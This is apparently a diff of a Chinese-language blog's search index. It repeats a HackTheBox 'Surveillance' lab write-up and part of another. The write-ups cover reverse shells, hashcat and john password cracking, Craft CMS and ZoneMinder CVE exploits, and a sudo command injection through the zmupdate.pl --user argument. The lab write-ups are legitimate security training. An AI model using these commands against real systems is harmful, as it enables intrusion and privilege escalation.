-<p>開彈reverse shell<br><img src="https://hackmd.io/_uploads/HkiFS9yxC.png" alt="image"><br>成功!!!  </p>
-<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>在本地port 8089架python http server<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8089</span><br></pre></td></tr></table></figure>
-<p>然後從機器抓小豌豆進去<br><img src="https://hackmd.io/_uploads/HyFzIckeA.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/H1UQI91gC.png" alt="image">  </p>
-<p><code>sudo</code>可以讓我打到變成root，所以要找到使用者密碼。<br>在本地有個檔案<code>Migration/pupilpath_credentials.db</code>，找到一個密碼，那很可能就是susan在機器上的密碼。<br><img src="https://hackmd.io/_uploads/r1Pq8c1x0.png" alt="image"><br>結合linpeas發現的可疑email檔案<img src="https://hackmd.io/_uploads/HJ6p8cyx0.png" alt="image"><br>找到密碼格式。<br><img src="https://hackmd.io/_uploads/HycRU9kxR.png" alt="image"><br>利用這些資訊配合hashcat進行密碼爆破：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  -m 1400  pass -a 3 <span class="string">&#x27;susan_nasus_?d?d?d?d?d?d?d?d?d&#x27;</span> -t 64</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HJczP9yxA.png" alt="image"><br>找到密碼<code>susan_nasus_413759210</code>！<br><img src="https://hackmd.io/_uploads/HJ04Oqyg0.png" alt="image"><br>最後成為<code>root</code>  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>我下午484應該挑一台Medium打打看(?)  </p>
-<p>附上比hashcat慢一點的python作法<br><img src="https://hackmd.io/_uploads/BJtPOq1gA.png" alt="image">  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -2954,36 +2954,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Surveillance Write Up on HackTheBox</title>
-    <url>/2024/04/08/surveillance-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
-<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
-<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
-<p>彈到 port 1004 get shell  </p>
-<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
-<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
-<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
-<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
-<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
-<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
-<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
-<p>上網google找到這個command injection，照打：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023 SunShine CTF Write Up</title>
     <url>/2023/10/14/sunshinectf/</url>
     <content><![CDATA[<p>Team Name:WAN<br>Rank:74<br><a href="https://2023.sunshinectf.org/teams/295">Link:https://2023.sunshinectf.org/teams/295</a>  </p>
@@ -3117,6 +3087,36 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>SunShine CTF</tag>
         <tag>Forensics</tag>
         <tag>Scripting</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Surveillance Write Up on HackTheBox</title>
+    <url>/2024/04/08/surveillance-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
+<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
+<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
+<p>彈到 port 1004 get shell  </p>
+<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
+<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
+<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
+<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
+<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
+<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
+<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
+<p>上網google找到這個command injection，照打：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -3645,9 +3645,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 ]]></content>
       <tags>
         <tag>CTF</tag>
+        <tag>Command Injection</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-        <tag>Command Injection</tag>
       </tags>
   </entry>
 </search>
